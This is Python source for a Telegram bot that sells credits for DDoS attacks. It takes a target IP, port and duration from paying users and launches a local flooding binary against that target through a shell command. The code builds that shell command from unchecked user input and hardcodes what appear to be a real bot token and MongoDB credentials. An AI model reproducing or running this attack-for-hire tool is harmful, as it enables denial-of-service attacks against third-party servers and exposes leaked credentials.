import os
import json
import telebot
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime
import certifi
from threading import Thread, Lock
import asyncio
from telebot import types
import pytz
import subprocess

# Initialize attack_loop
attack_loop = asyncio.new_event_loop()

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# --- CONFIGURATION ---
TOKEN = '8754814217:AAHRI70VWv9tM13w6iW-Peqq7Vh9pLYTHZU'
MONGO_URI = 'mongodb+srv://ddos62366_db_user:cYaNxOHsNl5mpvA8@cluster0.1bfayzm.mongodb.net/?appName=Cluster0'
ADMIN_IDS = [8318925500]
BINARY_NAME = "./bgmi" 
API_ENDPOINTS = []

# Global variables
attack_in_progress = False
attack_end_time = 0
attack_lock = Lock()
DEFAULT_THREADS = 6
PRICE_LIST = {"5": 75, "10": 130, "30": 400, "50": 700}
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

bot = telebot.TeleBot(TOKEN)

# Initialize MongoDB
try:
    client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
    db = client['danger']
    users_collection = db.users
    logging.info("MongoDB connected successfully")
except Exception as e:
    logging.error(f"MongoDB connection error: {e}")
    exit(1)

# --- HELPERS ---
def create_inline_keyboard():
    markup = types.InlineKeyboardMarkup()
    # Force Channel Button Hata Diya Gaya Hai (OFF)
    markup.add(types.InlineKeyboardButton("👤 Contact Admin", url="https://t.me/Golu_Admin"))
    return markup

def is_user_admin(user_id):
    return user_id in ADMIN_IDS

def get_price_list():
    return (
        "*💰 CREDIT PACKAGES 💰*\n\n"
        "*5 Credits:* 75 INR\n"
        "*10 Credits:* 130 INR\n"
        "*30 Credits:* 400 INR\n"
        "*50 Credits:* 700 INR\n\n"
        "Contact Admin to buy."
    )

# --- CORE ATTACK FUNCTION ---
async def run_binary_attack(chat_id, target_ip, target_port, duration):
    global attack_in_progress, attack_end_time
    command = f"chmod +x {BINARY_NAME} && {BINARY_NAME} {target_ip} {target_port} {duration} {DEFAULT_THREADS}"
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        logging.info(f"Binary attack started on {target_ip}:{target_port}")
        await asyncio.sleep(duration)
        process.terminate()
        with attack_lock:
            attack_in_progress = False
        bot.send_message(chat_id, "*✅ Attack Completed!*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
    except Exception as e:
        logging.error(f"Binary execution failed: {e}")
        with attack_lock:
            attack_in_progress = False
        bot.send_message(chat_id, "❌ Binary Error occurred.")

# --- COMMAND HANDLERS ---

@bot.message_handler(commands=['start'])
def start_message(message):
    bot.send_message(message.chat.id, "*🌍 WELCOME TO DDOS WORLD!* 🎉\n\n"
                                     "*🚀 Use /attack to launch attacks.*\n"
                                     "*💰 Check /pricelist for credits.*",
                                     reply_markup=create_inline_keyboard(), parse_mode='Markdown')

@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    user_id = message.from_user.id
    user_data = users_collection.find_one({"user_id": user_id})
    if not user_data or user_data.get('credits', 0) < 1:
        bot.send_message(message.chat.id, "*🚫 Insufficient Credits!*", parse_mode='Markdown')
        return
    with attack_lock:
        if attack_in_progress:
            bot.send_message(message.chat.id, "*⚠️ Bot is busy!*", parse_mode='Markdown')
            return

    bot.send_message(message.chat.id, "*💣 Enter: IP PORT TIME*\n*Example:* `1.1.1.1 80 300`", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_attack)

def process_attack(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "❗ Invalid Format! Use: `IP PORT TIME`", parse_mode='Markdown')
            return
        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])
        
        # --- MAX ATTACK 300 SECONDS SET ---
        if duration > 300:
            bot.send_message(message.chat.id, "❌ Max duration 300s allowed.", parse_mode='Markdown')
            return
            
        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"🔒 Port {target_port} is blocked.", parse_mode='Markdown')
            return

        users_collection.update_one({"user_id": message.from_user.id}, {"$inc": {"credits": -1}})
        global attack_in_progress, attack_end_time
        with attack_lock:
            attack_in_progress = True
            attack_end_time = time.time() + duration

        bot.send_message(message.chat.id, f"🚀 *Attack Sent via Binary!* \n🎯 {target_ip}:{target_port} \n⏳ Duration: {duration}s", parse_mode='Markdown')
        asyncio.run_coroutine_threadsafe(run_binary_attack(message.chat.id, target_ip, target_port, duration), attack_loop)
    except Exception as e:
        bot.send_message(message.chat.id, "❌ Error occurred during processing.", parse_mode='Markdown')

@bot.message_handler(commands=['myinfo'])
def myinfo_command(message):
    user_id = message.from_user.id
    user_data = users_collection.find_one({"user_id": user_id})
    credits = user_data.get('credits', 0) if user_data else 0
    bot.send_message(message.chat.id, f"👤 *User ID:* `{user_id}`\n💳 *Credits:* `{credits}`", parse_mode='Markdown')

@bot.message_handler(commands=['when'])
def when_command(message):
    global attack_in_progress, attack_end_time
    if attack_in_progress:
        remaining = max(0, int(attack_end_time - time.time()))
        bot.send_message(message.chat.id, f"⏳ *Attack In Progress*\nRemaining: `{remaining}s`", parse_mode='Markdown')
    else:
        bot.send_message(message.chat.id, "✅ *Bot Is Ready!*", parse_mode='Markdown')

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = ("*🌟 Available Commands:*\n\n"
                 "1. `/attack` - Launch attack (Max 300s)\n"
                 "2. `/myinfo` - Check balance\n"
                 "3. `/pricelist` - View prices\n"
                 "4. `/when` - Check status\n"
                 "5. `/rules` - Review rules\n"
                 "6. `/owner` - Contact Admin")
    bot.send_message(message.chat.id, help_text, parse_mode='Markdown', reply_markup=create_inline_keyboard())

@bot.message_handler(commands=['rules'])
def rules_command(message):
    rules_text = ("*📜 Bot Rules:*\n\n"
                  "1. No spamming attacks.\n"
                  "2. Stay under 40 kills.\n"
                  "3. Follow admin instructions.")
    bot.send_message(message.chat.id, rules_text, parse_mode='Markdown')

@bot.message_handler(commands=['owner'])
def owner_command(message):
    bot.send_message(message.chat.id, "*👤 Contact Admin for support.*", parse_mode='Markdown', reply_markup=create_inline_keyboard())

@bot.message_handler(commands=['pricelist'])
def price_list_cmd(message):
    bot.send_message(message.chat.id, get_price_list(), parse_mode='Markdown', reply_markup=create_inline_keyboard())

# --- ADMIN COMMANDS ---

@bot.message_handler(commands=['addcredits'])
def add_credits(message):
    if not is_user_admin(message.from_user.id): return
    try:
        args = message.text.split()
        users_collection.update_one({"user_id": int(args[1])}, {"$inc": {"credits": int(args[2])}}, upsert=True)
        bot.send_message(message.chat.id, "✅ Credits Added Successfully.")
    except Exception:
        bot.send_message(message.chat.id, "Usage: /addcredits <ID> <Credits>")

# --- MAIN ENGINE ---
def main():
    def start_loop():
        asyncio.set_event_loop(attack_loop)
        attack_loop.run_forever()
    Thread(target=start_loop, daemon=True).start()
    logging.info("Starting bot on Railway Hobby...")
    bot.infinity_polling()

if __name__ == "__main__":
    main()

